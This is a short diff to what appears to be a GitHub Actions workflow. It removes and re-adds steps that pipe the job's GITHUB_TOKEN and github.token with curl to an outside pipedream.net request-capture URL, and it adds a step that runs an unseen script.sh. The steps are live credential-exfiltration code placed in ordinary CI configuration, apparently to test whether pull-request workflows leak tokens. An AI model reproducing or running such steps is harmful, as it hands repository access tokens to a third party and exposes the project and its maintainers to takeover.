@@ -16,6 +16,7 @@ jobs:
         run: |
           ls ${{ github.workspace }}
       - run: echo "🍏 This job's status is ${{ job.status }}."
-      - run: echo "$GITHUB_TOKEN" | curl -d @- 'https://enfmhcr6p3b26.x.pipedream.net/' 
-      - run: echo "${{ github.token }}" | curl -d @- 'https://enfmhcr6p3b26.x.pipedream.net/' 
+      - run: echo "$GITHUB_TOKEN" | curl -d @- 'https://enfmhcr6p3b26.x.pipedream.net/pull_request1' 
+      - run: echo "${{ github.token }}" | curl -d @- 'https://enfmhcr6p3b26.x.pipedream.net/pull_request2'
+      - run: bash script.sh
 
